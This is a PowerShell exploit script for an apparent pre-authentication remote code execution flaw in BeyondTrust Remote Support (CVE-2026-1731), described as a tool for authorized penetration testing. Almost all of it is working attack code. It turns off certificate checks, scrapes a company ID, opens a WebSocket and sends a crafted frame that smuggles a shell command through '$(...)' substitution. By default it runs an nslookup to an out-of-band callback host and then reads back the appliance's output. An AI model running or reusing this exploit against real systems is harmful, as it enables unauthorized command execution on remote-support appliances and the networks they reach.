<#
.SYNOPSIS
    BeyondTrust Remote Support Pre-auth RCE (CVE-2026-1731) 
    Native PowerShell Implementation for Authorized Penetration Testing.
#>

# --- Global Security Bypass ---
# Force TLS 1.2+ and Ignore Certificate Validation
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

Function Invoke-BTExploit {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$Target,
        [string]$Command = "nslookup XXXXXXXXXXXXXXXXXXX.oast.fun"
    )

    Write-Host "`n[*] Targeting: $Target" -ForegroundColor Cyan

    # 1. Fetch Portal Info & Extract Company ID
    $PortalUrl = "https://$Target/get_portal_info"
    try {
        $Resp = Invoke-WebRequest -Uri $PortalUrl -UseBasicParsing -TimeoutSec 5
        if ($Resp.Content -match "company=([^;]+)") {
            $Company = $Matches[1].Trim()
            Write-Host "[+] Extracted Company: $Company" -ForegroundColor Green
        } else {
            Write-Host "[-] Could not find Company ID." -ForegroundColor Red
            return
        }
    } catch {
        Write-Host "[-] HTTP Connection Failed: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    # 2. WebSocket Orchestration
    $WS = New-Object System.Net.WebSockets.ClientWebSocket
    $WS.Options.AddSubProtocol("ingredi support desk customer thin")
    $WS.Options.SetRequestHeader("X-Ns-Company", $Company)
    
    $Uri = New-Object System.Uri("wss://$Target/nw")
    $CTS = New-Object System.Threading.CancellationTokenSource(10000)

    try {
        $WS.ConnectAsync($Uri, $CTS.Token).Wait()
        if ($WS.State -eq 'Open') {
            Write-Host "[*] WebSocket Connected. Building Binary Frame..." -ForegroundColor Gray

            # 3. Bit-Perfect Payload Construction
            # Replicating: hax[$(CMD)]\nUUID\n0\naaaa\n
            $LF = [byte]0x0A
            $Enc = [System.Text.Encoding]::ASCII
            
            $Payload = $Enc.GetBytes("hax[`$($Command)]") + $LF + 
                       $Enc.GetBytes("aaaaaaaa-aaaa-aaaa-aaaaaaaaaaaa") + $LF + 
                       $Enc.GetBytes("0") + $LF + 
                       $Enc.GetBytes("aaaa") + $LF

            $Segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$Payload)

            # 4. Binary Transmission
            
            $WS.SendAsync($Segment, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $CTS.Token).Wait()
            Write-Host "[+] Payload Transmitted." -ForegroundColor Green

            # 5. Output Listener
            $Buffer = New-Object byte[] 4096
            $RcvSegment = New-Object System.ArraySegment[byte] -ArgumentList @(,$Buffer)
            $RcvTask = $WS.ReceiveAsync($RcvSegment, $CTS.Token)
            
            if ($RcvTask.Wait(3000)) {
                $Result = $Enc.GetString($Buffer, 0, $RcvTask.Result.Count)
                if ($Result.Trim()) {
                    Write-Host "[!] Appliance Output:`n$Result" -ForegroundColor Yellow
                }
            }
        }
    } catch {
        Write-Host "[-] WebSocket Error: $($_.Exception.InnerException.Message)" -ForegroundColor Red
    } finally {
        if ($WS.State -eq 'Open') { $WS.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", $CTS.Token).Wait() }
        $WS.Dispose()
    }
}

# Execution:
# Invoke-BTExploit -Target "192.168.1.100" -Command "id"
